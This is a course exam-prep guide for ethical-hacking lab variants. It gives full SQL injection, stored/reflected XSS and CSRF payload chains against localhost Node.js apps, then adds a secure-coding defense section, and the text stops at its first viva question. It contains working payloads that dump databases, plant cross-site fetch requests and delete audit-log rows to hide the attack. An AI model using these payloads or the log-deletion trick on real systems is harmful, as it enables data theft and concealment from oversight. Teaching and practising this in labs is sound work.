# 🛡️ CSE 406: Computer Security Sessional — Online 2 Master Exam Preparation Guide
## Ethical Hacking: Multi-Stage Web Exploitation Chains (SQLi → Stored XSS → CSRF → Reflected XSS / Bonus Log Cleanup)

- **Course:** CSE 406 Computer Security Sessional (BUET)
- **Target Assessment:** Online 2 (Ethical Hacking / Web Security)
- **Time Limit:** 40 Minutes
- **Scope:** Complete analysis, theory, mechanics, payloads, and defense for **All 4 Problem Variants** (Base Practice Problem, Section A1, Section B1, Section C1).

---

## 📑 Table of Contents
1. [Exam Landscape & Architecture Matrix](#1-exam-landscape--architecture-matrix)
2. [Universal Exploitation Methodology (The 40-Minute Game Plan)](#2-universal-exploitation-methodology-the-40-minute-game-plan)
3. [Deep-Dive Theory & Technical Mechanics](#3-deep-dive-theory--technical-mechanics)
   - [SQL Injection & Database Introspection](#a-sql-injection--database-introspection)
   - [Stacked Queries (Multi-Statement Execution)](#b-stacked-queries-multi-statement-execution)
   - [CORS Preflight vs Simple Requests](#c-cors-preflight-vs-simple-requests)
   - [SameSite Cookie Mechanics on Localhost](#d-samesite-cookie-mechanics-on-localhost)
   - [Script Parsing Traps & URL Encoding Schemes](#e-script-parsing-traps--url-encoding-schemes)
   - [Inert Feeds vs Reflected Execution Mechanisms](#f-inert-feeds-vs-reflected-execution-mechanisms)
   - [Forensic Audit Trail Discovery & Deletion](#g-forensic-audit-trail-discovery--deletion)
4. [Complete Variant Walkthroughs & Payloads](#4-complete-variant-walkthroughs--payloads)
   - [Variant 0: Base Practice Problem (Result Site + Social Media)](#variant-0-base-practice-problem-result-site--social-media)
   - [Variant 1: Section A1 (Library Fines + Campus Marketplace)](#variant-1-section-a1-library-fines--campus-marketplace)
   - [Variant 2: Section B1 (Gym Check-In + Campus Forum)](#variant-2-section-b1-gym-check-in--campus-forum)
   - [Variant 3: Section C1 (Course Registration + Study Group Chat)](#variant-3-section-c1-course-registration--study-group-chat)
5. [Rapid Exam Decision Flowchart & Pattern Matcher](#5-rapid-exam-decision-flowchart--pattern-matcher)
6. [Defense & Secure Coding Guide (Viva / Written Theory)](#6-defense--secure-coding-guide-viva--written-theory)
7. [High-Probability Viva Defense Q&A](#7-high-probability-viva-defense-qa)
8. [Quick-Fire Payload & Command Cheat Sheet](#8-quick-fire-payload--command-cheat-sheet)

---

## 1. Exam Landscape & Architecture Matrix

Every Online 2 problem pairs **two isolated Node.js/Express web applications** running against a containerized **MySQL 8.0 instance** stored in volatile RAM (`tmpfs`). One application possesses an unsanitized SQL injection vulnerability with stacked statements enabled; the other is a secondary authenticated service vulnerable to Cross-Site Request Forgery (CSRF) and/or Cross-Site Scripting (XSS).

### Master Comparison Matrix

| Attribute | Variant 0 (Practice) | Section A1 (Fines/Market) | Section B1 (Gym/Forum) | Section C1 (Reg/Chat) |
|---|---|---|---|---|
| **App 1 (SQLi Portal)** | Result Site (`:3000`) | Library Fines (`:4000`) | Gym Check-In (`:5000`) | Course Reg (`:3000`) |
| **App 2 (CSRF/XSS)** | Social Media (`:3001`) | Marketplace (`:4001`) | Campus Forum (`:5001`) | Group Chat (`:3001`) |
| **Attacker Credentials** | `3005001` / `Smith123` | `4100001` / `rahman-41` | `7700001` / `fit-nabila-17` | `9900001` / `reg-isha-29` |
| **Victim Credentials** | `3005002` / `Johnson123` | `4100002` / `karim-41` | `7700002` / `fit-rafi-17` | `9900002` / `reg-fahim-29` |
| **Extraction Goal** | 100 students' CGPAs | All unpaid library fines | 15 members' credits | 15 students' balances |
| **SQLi Complexity** | Multi-page batching | `SUM()` + `IFNULL(..., 0)` | Direct `GROUP_CONCAT` | Direct `GROUP_CONCAT` |
| **Stacked Write Target** | Attacker's own record | Attacker's own record | **Victim's record (`7700002`)** | Attacker's own record |
| **Dynamic Calculation** | `cgpa` column via `CONCAT` | Subquery `SELECT SUM(...)` | Pre-encoded search URL | URL-encoded `<script>` |
| **CSRF Endpoint** | `POST /create` | `POST /list` | `POST /reply` | `POST /send` |
| **CSRF Body Format** | `message=I+got+<cgpa>` | `title=I+owe+<amt>&price=<amt>` | `message=<encoded_url>` | `message=<encoded_script>` |
| **App 2 Exploit Type** | Dynamic CSRF Post | Dynamic CSRF Listing | Inert Link → Reflected XSS | Stored Second-Order XSS |
| **Trigger Mechanism** | Attacker checks result | Attacker checks fines | **Victim checks gym status** | Attacker checks status |
| **Execution Context** | Attacker's social feed | Attacker's marketplace | Search page unescaped `<p>` | Independent victim feed |
| **Audit Log Cleanup** | None (Base lab) | `a1_fines.log` | `b1_gym.log` | `c1_registration.log` |

---

## 2. Universal Exploitation Methodology (The 40-Minute Game Plan)

When the timer starts, allocate your 40 minutes systematically:

```
[00:00 - 05:00] Environment Setup & Port Verification
       │
[05:00 - 15:00] Task 1: Reconnaissance & Database Extraction (UNION SQLi)
       │
[15:00 - 25:00] Task 2 & 3: Persistent Payload & CSRF Construction (Stacked UPDATE)
       │
[25:00 - 32:00] Task 4: Victim Trigger / Reflected Execution Verification
       │
[32:00 - 36:00] Task 5: Forensic Trail Discovery & Cleanup (Bonus Stacked DELETE)
       │
[36:00 - 40:00] Submission File Generation & Quality Check (2105XXX.txt)
```

### Phase 1: Environment Boot (Minutes 0–5)
1. Load images and start containers:
   ```bash
   docker load --input <Section>-images.tar
   docker compose up -d
   docker compose ps
   ```
2. Open both URLs in your browser to confirm health checks pass.

### Phase 2: Reconnaissance & Extraction (Minutes 5–15)
1. Identify vulnerable field by injecting `' AND '1'='1` vs `' AND '1'='0`.
2. Determine column count: `<valid_secret>' ORDER BY N LIMIT 1 -- -` incrementing $N$ until failure.
3. Identify reflected text columns: `' UNION SELECT 1, 2, ..., N -- -`.
4. Enumerate database name: `' UNION SELECT 1, '', DATABASE(), ... -- -`.
5. Enumerate tables: `' UNION SELECT 1, '', GROUP_CONCAT(table_name), ... FROM information_schema.tables WHERE table_schema=DATABASE() -- -`.
6. Enumerate columns: `' UNION SELECT 1, '', GROUP_CONCAT(column_name), ... FROM information_schema.columns WHERE table_name='<target_table>' -- -`.
7. Extract roster using formatted `GROUP_CONCAT()`.

### Phase 3: Persistent Stored XSS & CSRF (Minutes 15–25)
1. Test stacked execution: `<valid_secret>'; UPDATE <target_table> SET <text_col>='<b>TEST</b>' WHERE <id_col>=<id>; -- -`.
2. Inspect App 2 form submission:
   - Method (`POST`), Endpoint (`/create`, `/list`, `/reply`, `/send`), Content-Type (`application/x-www-form-urlencoded`).
3. Formulate minimal `fetch()` without custom headers (CORS Simple Request):
   ```javascript
   fetch("http://localhost:<APP2_PORT>/<endpoint>", {
     method: "POST",
     headers: { "Content-Type": "application/x-www-form-urlencoded" },
     credentials: "include",
     body: "<encoded_params>"
   });
   ```
4. Embed inside `<script>` tag and write into the database using stacked `UPDATE`.

### Phase 4: Execution & Verification (Minutes 25–32)
1. Determine who triggers the payload:
   - **Self-trigger (C1 / A1 / Base):** Attacker views their own record on App 1 while logged into App 2.
   - **Victim-trigger (B1):** Victim logs into App 2, then logs into App 1 with their legitimate credentials.
2. Verify App 2 receives the dispatched CSRF.
3. Verify viewer execution (checking browser tab title change to target marker).

### Phase 5: Bonus Forensic Cleanup (Minutes 32–36)
1. Check `log` table columns (`id, submitted_id, submitted_secret, attempted_at`).
2. Submit stacked `DELETE`:
   ```sql
   <valid_secret>'; DELETE FROM log WHERE submitted_id = '<attacker_id>'; -- -
   ```
3. Verify attacker rows are deleted while victim/health checks remain.

### Phase 6: Submission Packaging (Minutes 36–40)
Create `2105XXX.txt` adhering strictly to Moodle prompt requirements.

---

## 3. Deep-Dive Theory & Technical Mechanics

### A. SQL Injection & Database Introspection

#### 1. Breaking Out of String Literals
Backend queries in vulnerable Node.js servers concatenate input directly:
```javascript
const sql = `SELECT * FROM member WHERE id = ? AND pin = '${userPin}'`;
```
Submitting `pin = secret' OR '1'='1` produces:
```sql
SELECT * FROM member WHERE id = '4100001' AND pin = 'secret' OR '1'='1'
```
Submitting a comment `-- -` (or `#` or `/* */`) drops everything after the injection point:
```sql
SELECT * FROM member WHERE id = '4100001' AND pin = 'secret' -- -'
```

#### 2. Deducing Column Count with `ORDER BY`
In SQL, `ORDER BY N` sorts the result by the $N$-th column of the `SELECT` projection (1-indexed).
- If the query projects 5 columns, `ORDER BY 5` succeeds.
- `ORDER BY 6` causes an immediate database error (`Unknown column '6' in 'order clause'`), rendering an empty page or 500 error.
- **Rule:** The largest number that produces a valid page equals the exact column count.

#### 3. Mapping Reflected Columns
A `UNION SELECT` combines results from two queries. Rules:
1. Both queries must project the **exact same number of columns**.
2. Corresponding column types must be compatible.
Submitting:
```sql
' UNION SELECT 1, 2, 3, 4, 5 -- -
```
When the first query returns 0 rows (because `id` or `pin` is invalid), the second query provides the rows. If the browser displays `"2 3"` in the Name field and `"5.00"` in the Amount field:
- Column 2 & 3 are reflected as text.
- Column 5 is reflected as a number (e.g. `DECIMAL(10,2)`).
- Injecting text strings into Column 5 will cause a SQL runtime type error! Always place arbitrary strings in columns mapped to `VARCHAR`.

#### 4. Introspection via `information_schema`
MySQL maintains metadata in the `information_schema` catalog:
- Current Database Name: `DATABASE()`
- Enumerate Tables:
  ```sql
  SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = DATABASE()
  ```
- Enumerate Columns:
  ```sql
  SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'target_table'
  ```

#### 5. The 1024-Byte `group_concat_max_len` Limitation & Pagination
In standard MySQL, `GROUP_CONCAT()` silently truncates output exceeding 1024 bytes.
- In 15-member rosters (A1, B1, C1), all 15 records comfortably fit in ~600 bytes.
- In 100-student rosters (Base Problem), output cuts off around student 31.
- **Bypass via Keyset Pagination:** Add a `WHERE id > last_seen_id ORDER BY id` filter to extract subsequent batches.

---

### B. Stacked Queries (Multi-Statement Execution)

In Node.js, the `mysql2` library disables multi-statement queries by default. However, vulnerable configurations enable:
```javascript
const pool = mysql.createPool({
  ...,
  multipleStatements: true
});
```
This allows terminating the original `SELECT` with `;` and chaining subsequent queries:
```sql
SELECT ... WHERE pin = 'secret'; UPDATE member SET last_name = 'payload'; -- -'
```
Backend servers typically only render the rows of the **first statement**:
```javascript
function firstStatementRows(results) {
  if (!Array.isArray(results)) return [];
  return Array.isArray(results[0]) ? results[0] : results;
}
```
Thus, the page continues to render normally while the second statement silently mutates the database!

---

### C. CORS Preflight vs Simple Requests

When JavaScript running on `http://localhost:3000` issues a `fetch()` to `http://localhost:3001/create`:

```
               [ Origin: http://localhost:3000 ]
                              │
               Is it a CORS Simple Request?
                     /                  \
                  YES                    NO (has custom headers or application/json)
                   │                                     │
         Sends POST directly                   Sends OPTIONS Preflight
                   │                                     │
         Server executes POST!               Server lacks CORS headers
                   │                                     │
     Browser blocks JS from reading          Browser drops request completely!
       response (Does NOT matter!)               (CSRF FAILS COMPLETELY!)
```

#### What Qualifies as a CORS Simple Request?
1. Method is `GET`, `HEAD`, or `POST`.
2. Headers are strictly simple headers (`Accept`, `Accept-Language`, `Content-Language`, `Content-Type`).
3. `Content-Type` is one of:
   - `application/x-www-form-urlencoded`
   - `multipart/form-data`
   - `text/plain`

> [!IMPORTANT]
> Never copy-paste raw DevTools `fetch` snippets! They contain non-standard headers (`sec-ch-ua`, `sec-fetch-mode`, etc.) that trigger an `OPTIONS` preflight. Strip everything except `Content-Type: application/x-www-form-urlencoded`.

---

### D. SameSite Cookie Mechanics on Localhost

Why does `credentials: "include"` transmit session cookies across different ports on `localhost`?

#### RFC 6265bis Cookie Rules
- **Origin (Same-Origin Policy):** Scheme + Hostname + **Port**. (`http://localhost:3000` and `http://localhost:3001` are **Cross-Origin**).
- **Site (SameSite Cookie Policy):** Scheme + **Registrable Domain (eTLD+1)**. **Port numbers are explicitly ignored!**
- Because both services run on `localhost`, they share the **exact same site** (`localhost`).
- A cross-port request on `localhost` is **Same-Site**. Under `SameSite=Lax`, cookies are permitted on top-level navigations and requests with `credentials: "include"`.

---

### E. Script Parsing Traps & URL Encoding Schemes

When embedding JavaScript inside HTML or SQL strings, developers encounter subtle syntax traps:

#### 1. The Literal `</script>` Termination Trap
If the sequence `</script>` appears anywhere inside an inline `<script>` block—even inside a JavaScript string literal:
```html
<script>
  let x = "</script>"; // The HTML parser immediately terminates the script tag here!
</script>
```
The HTML tokenizer gives precedence to `</script>` over JavaScript string grammar.
- **Fix 1 (JS context):** Escape the slash: `<\/script>`.
- **Fix 2 (URL context):** URL-encode special characters: `%3C%2Fscript%3E`.

#### 2. Double URL Encoding (The B1 Architecture)
In Section B1:
- Level 1: `<script>document.title='B1-REFLECTED-XSS';</script>` is encoded for the search URL query parameter `?q=`:
  `http://localhost:5001/search?q=%3Cscript%3Edocument.title%3D%27B1-REFLECTED-XSS%27%3B%3C%2Fscript%3E`
- Level 2: The entire URL is encoded as the form body for `POST /reply`:
  `message=http%3A%2F%2Flocalhost%3A5001%2Fsearch%3Fq%3D%253Cscript%253Edocument.title...`
- When Express processes the `POST`, it decodes Level 2, storing Level 1 in the database.
- When the victim clicks the link, Express decodes Level 1, delivering the raw script to the search page!

#### 3. Best Protocol for Safe Decoding (Avoid `URIError`)
When automating attacks or generating payloads, standard decoding often fails due to `+` characters (which represent spaces in POST form bodies) or malformed `%` signs. Use these robust wrappers to perfectly decode payloads:

**JavaScript (For automation scripts):**
```javascript
function safeDecode(str, layers = 1, isFormData = true) {
    let decoded = str;
    for (let i = 0; i < layers; i++) {
        try {
            // If it's form data, replace '+' with spaces first!
            if (isFormData) decoded = decoded.replace(/\+/g, ' ');
            decoded = decodeURIComponent(decoded);
        } catch (e) {
            console.error(`[Error] Failed to decode at layer ${i + 1}.`);
            return decoded; // Return what successfully decoded
        }
    }
    return decoded;
}
```

**Python (For payload generation):**
```python
import urllib.parse

def safe_decode(payload, layers=1):
    decoded = payload
    for _ in range(layers):
        # unquote_plus safely handles BOTH %20 AND + as spaces
        decoded = urllib.parse.unquote_plus(decoded)
    return decoded
```

---

### F. Inert Feeds vs Reflected Execution Mechanisms

In Section B1, the specification requires that the forum post remains **inert** until clicked.

#### How `safeLinkify()` Sanitizes the Feed:
```javascript
function safeLinkify(value) {
  const text = String(value);
  const urlPattern = /https?:\/\/[^\s]+/g;
  let html = "";
  let cursor = 0;
  for (const match of text.matchAll(urlPattern)) {
    const index = match.index;
    const url = match[0];
    html += escapeHtml(text.slice(cursor, index));
    html += `<a href="${escapeHtml(url)}">${escapeHtml(url)}</a>`;
    cursor = index + url.length;
  }
  html += escapeHtml(text.slice(cursor));
  return html;
}
```
- The feed escapes the URL with `escapeHtml()` and encloses it inside an `<a>` tag.
- It is rendered as clickable text, **not** an executable `<script>` DOM element. The feed remains 100% inert.

#### Why Reflected XSS Triggers on `/search`:
```javascript
const resultHtml = results.length
  ? results.map((row) => `<li>${escapeHtml(row.body)}</li>`).join("\n")
  : `<p>No results for "${q}"</p>`;
```
- If results match, output is sanitized with `escapeHtml()`.
- But if **0 results match**, the server falls back to `<p>No results for "${q}"</p>`.
- **`${q}` is interpolated without `escapeHtml()`!**
- Because the database stores the encoded `%3Cscript%3E...`, the search query for literal `<script>...` matches **zero rows**, intentionally triggering the unescaped fallback!

---

### G. Forensic Audit Trail Discovery & Deletion

Most exam portals maintain an audit table:
```sql
CREATE TABLE log (
  id INT AUTO_INCREMENT PRIMARY KEY,
  submitted_id VARCHAR(50),
  submitted_secret VARCHAR(1500),
  attempted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
```
Every HTTP request executes an insertion prior to query processing:
```javascript
await pool.execute("INSERT INTO log (submitted_id, submitted_secret) VALUES (?, ?)", [id, secret]);
```

#### The Self-Cleaning Mechanics
If you submit:
```sql
<secret>'; DELETE FROM log WHERE submitted_id = '<attacker_id>'; -- -
```
1. Server logs the cleanup attempt:
   `INSERT INTO log VALUES ('<attacker_id>', '<secret>\'; DELETE ...')`
2. Server executes the query:
   `SELECT ...; DELETE FROM log WHERE submitted_id = '<attacker_id>'; -- -`
3. The `DELETE` statement deletes **all** records matching `submitted_id = '<attacker_id>'`, which purges all prior exploits **and the cleanup request itself**!
4. Other users' rows (e.g. initial health checks or victim actions) have different `submitted_id` values and remain preserved.

---

## 4. Complete Variant Walkthroughs & Payloads

---

### Variant 0: Base Practice Problem (Result Site + Social Media)

- **Port 3000:** Result Portal (`http://localhost:3000`)
- **Port 3001:** Social Media Site (`http://localhost:3001`)
- **Attacker Account:** Student ID `3005001`, Password `Smith123`, Social Username `liam_smith`
- **Objective:** Extract all 100 CGPAs; configure Stored XSS → CSRF auto-posting `"I got <CGPA>"` upon viewing result.

#### Task 1: CGPA Extraction via Paginated UNION SQLi
- Target Field: `password` (Student ID fixed at `3005001`)
- Query expects 5 columns. Name is Columns 2 & 3. Column 5 is CGPA.
- Batch 1 (IDs 3005001 to ~3005031):
  ```sql
  ' UNION SELECT 1,'',GROUP_CONCAT(student_id, ' ', first_name, ' ', last_name, ' : ', cgpa, '<br>'),4,5 FROM result ORDER BY student_id -- -
  ```
- Batch 2 (IDs 3005032 to ~3005062):
  ```sql
  ' UNION SELECT 1,'',GROUP_CONCAT(student_id, ' ', first_name, ' ', last_name, ' : ', cgpa, '<br>'),4,5 FROM result WHERE student_id > 3005031 ORDER BY student_id -- -
  ```
- Batch 3 (IDs 3005063 to ~3005094):
  ```sql
  ' UNION SELECT 1,'',GROUP_CONCAT(student_id, ' ', first_name, ' ', last_name, ' : ', cgpa, '<br>'),4,5 FROM result WHERE student_id > 3005062 ORDER BY student_id -- -
  ```
- Batch 4 (IDs 3005095 to 3005100):
  ```sql
  ' UNION SELECT 1,'',GROUP_CONCAT(student_id, ' ', first_name, ' ', last_name, ' : ', cgpa, '<br>'),4,5 FROM result WHERE student_id > 3005094 ORDER BY student_id -- -
  ```

#### Task 2: Stored XSS → CSRF Auto-Poster
- Target Field: `password`
- Payload:
  ```sql
  Smith123'; UPDATE result SET last_name = CONCAT('<script>fetch("http://localhost:3001/create", { "headers": { "content-type": "application/x-www-form-urlencoded", }, "body": "message=I+got+', cgpa, '", "method": "POST", "credentials": "include" });</script>'); -- -
  ```

---

### Variant 1: Section A1 (Library Fines + Campus Marketplace)

- **Port 4000:** Library Fines Portal (`http://localhost:4000`)
- **Port 4001:** Campus Marketplace (`http://localhost:4001`)
- **Attacker Account:** Member ID `4100001`, PIN `rahman-41`, Market User `anika.rahman`, Market Password `market-Anika-41`
- **Victim Account:** Member ID `4100002`, PIN `karim-41`, Market User `farhan.karim`, Market Password `market-Farhan-41`
- **Database:** `a1_fines` (Tables: `fine_record`, `member`, `log`)

#### Task 1 & 2: SQLi Confirmation & Schema Discovery
- Column count: `rahman-41' ORDER BY 4 LIMIT 1 -- -` (4 columns exist; breaks at 5).
- Visible mapping: `' UNION SELECT 1, 2, 3, 4 -- -` (Columns 2, 3, 4 reflected).
- Tables: `' UNION SELECT 1, GROUP_CONCAT(table_name), '', 4 FROM information_schema.tables WHERE table_schema=DATABASE() -- -` → `fine_record, log, member`.
- Columns:
  - `fine_record`: `amount, fine_id, member_id, reason, status` (status: `PAID`, `UNPAID`)
  - `member`: `first_name, last_name, member_id, pin`
  - `log`: `attempted_at, id, submitted_id, submitted_secret`

#### Task 3: Complete Aggregate Extraction (with Zero-Totals)
- Application: Library Fines (`http://localhost:4000/`)
- Member ID: `4100001`, PIN:
  ```sql
  ' UNION SELECT 1, GROUP_CONCAT(member_id, ' ', first_name, ' ', last_name, ' : $', IFNULL((SELECT SUM(amount) FROM fine_record WHERE member_id = m.member_id AND status = 'UNPAID'), 0) SEPARATOR '<br>'), '', 4 FROM member m -- -
  ```
- **Extracted Roster (15 Members):**
  ```text
  4100001 Anika Rahman : $20.25
  4100002 Farhan Karim : $41.50
  4100003 Mehjabin Sultana : $0.00
  4100004 Tahmid Hasan : $22.65
  4100005 Nusrat Jahan : $67.00
  4100006 Samin Hossain : $10.00
  4100007 Afsana Kabir : $0.00
  4100008 Rayhan Ahmed : $24.00
  4100009 Tasnim Akter : $14.00
  4100010 Adnan Mahmud : $33.30
  4100011 Fariha Noor : $6.75
  4100012 Abrar Siddique : $48.90
  4100013 Lamisa Haque : $0.00
  4100014 Zarif Uddin : $40.00
  4100015 Maliha Khan : $7.00
  ```

#### Task 4 & 5: Persistent Browser Payload & End-to-End Marketplace CSRF
- Requirement: Listing title must be `I owe $<total> in fines`, price must be `<total>`, calculated dynamically from database.
- Application: Library Fines (`http://localhost:4000/`)
- Member ID: `4100001`, PIN:
  ```sql
  rahman-41'; UPDATE member m SET last_name = CONCAT('<script>fetch("http://localhost:4001/list",{method:"POST",headers:{"content-type":"application/x-www-form-urlencoded"},credentials:"include",body:"title=I+owe+$', (SELECT SUM(amount) FROM fine_record WHERE member_id = m.member_id AND status = 'UNPAID'), '+in+fines&price=', (SELECT SUM(amount) FROM fine_record WHERE member_id = m.member_id AND status = 'UNPAID'), '"});</script>') WHERE member_id = 4100001; -- -
  ```

#### Task 6: Bonus Forensic Cleanup
- Application: Library Fines (`http://localhost:4000/`)
- Member ID: `4100001`, PIN:
  ```sql
  rahman-41'; DELETE FROM log WHERE submitted_id = '4100001'; -- -
  ```

---

### Variant 2: Section B1 (Gym Check-In + Campus Forum)

- **Port 5000:** Gym Check-In (`http://localhost:5000`)
- **Port 5001:** Campus Forum (`http://localhost:5001`)
- **Attacker Account:** Member ID `7700001`, Code `fit-nabila-17`, Forum User `nabila.chowdhury`, Forum Pass `forum-Nabila-17`
- **Victim Account:** Member ID `7700002`, Code `fit-rafi-17`, Forum User `rafi.islam`, Forum Pass `forum-Rafi-17`
- **Database:** `b1_gym` (Tables: `membership`, `log`), `b1_forum` (Tables: `app_user`, `message`)

#### Task 1: Database Extraction
- Application: Gym Check-In (`http://localhost:5000/`)
- Member ID: `7700001`, Access Code:
  ```sql
  ' UNION SELECT 1, 2, '', GROUP_CONCAT(id, ' ', first_name, ' ', last_name, ' : ', credits_remaining SEPARATOR '<br>'), 5 FROM membership -- -
  ```
- **Extracted Roster (15 Members):**
  ```text
  7700001 Nabila Chowdhury : 18
  7700002 Rafi Islam : 7
  7700003 Sadia Alam : 24
  7700004 Arman Bashar : 11
  7700005 Sumaiya Reza : 29
  7700006 Nafis Iqbal : 3
  7700007 Pranto Saha : 15
  7700008 Ornela Das : 21
  7700009 Mahin Azad : 0
  7700010 Rumana Ferdous : 26
  7700011 Tanvir Amin : 9
  7700012 Samira Huq : 13
  7700013 Rafid Anwar : 5
  7700014 Muntaha Zaman : 30
  7700015 Shafin Roy : 16
  ```

#### Task 2: Targeted Persistent Modification on Victim `7700002`
- Application: Gym Check-In (`http://localhost:5000/`)
- Member ID: `7700001`, Access Code:
  ```sql
  fit-nabila-17'; UPDATE membership SET last_name = 'Islam <script>fetch("http://localhost:5001/reply",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},credentials:"include",body:"message=http%3A%2F%2Flocalhost%3A5001%2Fsearch%3Fq%3D%253Cscript%253Edocument.title%253D%2527B1-REFLECTED-XSS%2527%253B%253C%252Fscript%253E"});</script>' WHERE id = 7700002; -- -
  ```
- *Note:* Attacker `7700001` remains unaltered. Victim `7700002`'s `last_name` receives the payload.

#### Task 3: Victim-Session CSRF
- Pre-condition: Victim `rafi.islam` logs into Campus Forum (`http://localhost:5001/login`).
- Trigger: Victim performs regular check-in on Gym Check-In (`http://localhost:5000/`) using Member ID `7700002` and Access Code `fit-rafi-17`.
- The page renders the script, executing a cross-port CSRF `POST /reply` attaching the victim's active `b1_sid` cookie.

#### Task 4: Reflected-XSS Link Execution
- On forum feed (`/`), `safeLinkify()` sanitizes and wraps the URL in `<a href="...">`, keeping the feed **inert**.
- Clicking the link navigates to:
  `http://localhost:5001/search?q=%3Cscript%3Edocument.title%3D%27B1-REFLECTED-XSS%27%3B%3C%2Fscript%3E`
- Express URL-decodes `q` to `<script>document.title='B1-REFLECTED-XSS';</script>`.
- Query matches 0 rows. Fallback renders `<p>No results for "${q}"</p>` **unescaped**.
- Script executes and modifies document title to `B1-REFLECTED-XSS`.

#### Task 5: Bonus Forensic Cleanup
- Application: Gym Check-In (`http://localhost:5000/`)
- Member ID: `7700001`, Access Code:
  ```sql
  fit-nabila-17'; DELETE FROM log WHERE submitted_id = '7700001'; -- -
  ```

---

### Variant 3: Section C1 (Course Registration + Study Group Chat)

- **Port 3000:** Course Registration (`http://localhost:3000`)
- **Port 3001:** Study Group Chat (`http://localhost:3001`)
- **Attacker Account:** Student ID `9900001`, PIN `reg-isha-29`, Chat User `isha.sen`, Chat Pass `chat-Isha-29`
- **Victim Account:** Student ID `9900002`, PIN `reg-fahim-29`, Chat User `fahim.mirza`, Chat Pass `chat-Fahim-29`
- **Database:** `c1_registration` (Tables: `registration`, `log`), `c1_chat` (Tables: `app_user`, `message`)

#### Task 1: Database Extraction
- Application: Course Registration (`http://localhost:3000/`)
- Student ID: `9900001`, Registration PIN:
  ```sql
  ' UNION SELECT 1, 2, '', GROUP_CONCAT(student_id, ' ', first_name, ' ', last_name, ' : ', balance_due SEPARATOR '<br>'), 5 FROM registration -- -
  ```
- **Extracted Roster (15 Students):**
  ```text
  9900001 Isha Sen : 315.50
  9900002 Fahim Mirza : 880.00
  9900003 Jannat Ara : 0.00
  9900004 Shadman Ali : 1240.75
  9900005 Rukaiya Binte : 99.99
  9900006 Sakib Morshed : 450.25
  9900007 Antora Paul : 760.00
  9900008 Mashrur Rahim : 150.50
  9900009 Arin Sarker : 1999.00
  9900010 Nahin Ahmed : 540.40
  9900011 Sanjida Hossain : 25.00
  9900012 Ridwan Kabir : 675.65
  9900013 Joana Gomes : 300.00
  9900014 Muhtasim Haque : 1080.10
  9900015 Adhora Khan : 210.20
  ```

#### Task 2: First Stored XSS via Stacked Statement
- Application: Course Registration (`http://localhost:3000/`)
- Student ID: `9900001`, Registration PIN:
  ```sql
  reg-isha-29'; UPDATE registration SET last_name = 'Sen <script>fetch("http://localhost:3001/send",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},credentials:"include",body:"message=%3Cscript%3Edocument.title%3D%27C1-SECOND-ORDER-XSS%27%3B%3C%2Fscript%3E"});</script>' WHERE student_id = 9900001; -- -
  ```

#### Task 3: CSRF Carrying Executable Content
- Attacker logs into Chat (`http://localhost:3001/login`) as `isha.sen`.
- Attacker checks normal status on Course Registration (`http://localhost:3000/`) with ID `9900001` and PIN `reg-isha-29`.
- The browser renders the stored script and dispatches a cross-port CSRF `POST /send` attaching `c1_sid`, saving `<script>document.title='C1-SECOND-ORDER-XSS';</script>` into chat.

#### Task 4: Independent-Viewer Execution
- Victim `fahim.mirza` logs into Chat (`http://localhost:3001/login`).
- Chat feed renders raw unescaped message body.
- Victim's browser executes script, changing document title to `C1-SECOND-ORDER-XSS`.

#### Task 5: Bonus Forensic Cleanup
- Application: Course Registration (`http://localhost:3000/`)
- Student ID: `9900001`, Registration PIN:
  ```sql
  reg-isha-29'; DELETE FROM log WHERE submitted_id = '9900001'; -- -
  ```

---

## 5. Rapid Exam Decision Flowchart & Pattern Matcher

Use this decision tree to immediately map whatever prompt you receive in the exam:

```text
                                [ Read Exam Prompt ]
                                          │
                   Does the prompt mention a second user executing?
                     /                                         \
                  YES                                           NO
                   │                                             │
    Is the XSS in feed or on search?                 Does the listing require dynamic math?
      /                          \                              /                       \
   FEED (C1)                  SEARCH (B1)                    YES (A1)                 NO (Base)
   Target: Attacker row       Target: Victim row             Target: Attacker row     Target: Attacker row
   Payload: Stored XSS        Payload: Double-encoded        Payload: Subquery SUM    Payload: Column cgpa
   CSRF: /send                CSRF: /reply                   CSRF: /list              CSRF: /create
   Execution: Stored XSS      Execution: Reflected XSS       Execution: Listing       Execution: Feed Post
```

---

## 6. Defense & Secure Coding Guide (Viva / Written Theory)

### 1. Remediating SQL Injection
- **Vulnerable Code:**
  ```javascript
  const sql = `SELECT * FROM users WHERE id = '${id}' AND pin = '${pin}'`;
  const [rows] = await pool.query(sql);
  ```
- **Remediated Code (Parameterized Prepared Statements):**
  ```javascript
  const sql = "SELECT * FROM users WHERE id = ? AND pin = ?";
  const [rows] = await pool.execute(sql, [id, pin]);
  ```
- **Disable Multi-Statements:** Set `multipleStatements: false` in database configuration.

### 2. Remediating Stored & Reflected XSS
- **Vulnerable Code:**
  ```javascript
  res.send(`<tr><td>${row.first_name} ${row.last_name}</td></tr>`);
  res.send(`<p>No results for "${q}"</p>`);
  ```
- **Remediated Code (Context-Aware HTML Entity Escaping):**
  ```javascript
  function escapeHtml(str) {
    return String(str)
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#39;");
  }
  res.send(`<tr><td>${escapeHtml(row.first_name)} ${escapeHtml(row.last_name)}</td></tr>`);
  res.send(`<p>No results for "${escapeHtml(q)}"</p>`);
  ```

### 3. Remediating Cross-Site Request Forgery (CSRF)
1. **Synchronizer Token Pattern (Anti-CSRF Tokens):**
   - Generate a cryptographically strong random token per session (`crypto.randomBytes(32).toString('hex')`).
   - Store in session and render into forms as `<input type="hidden" name="_csrf" value="${csrfToken}">`.
   - On `POST`, reject requests where `req.body._csrf !== req.session.csrfToken`.
2. **SameSite Cookie Hardening:**
   - Configure session cookies with `SameSite=Strict`:
     ```javascript
     res.setHeader("Set-Cookie", `sid=${sid}; HttpOnly; SameSite=Strict; Path=/`);
     ```
3. **Origin & Referer Header Verification:**
   - Verify `req.headers.origin === "http://localhost:3001"`. Reject cross-origin POSTs.

---

## 7. High-Probability Viva Defense Q&A

### Q1: Why did the browser allow `credentials: "include"` cross-port?
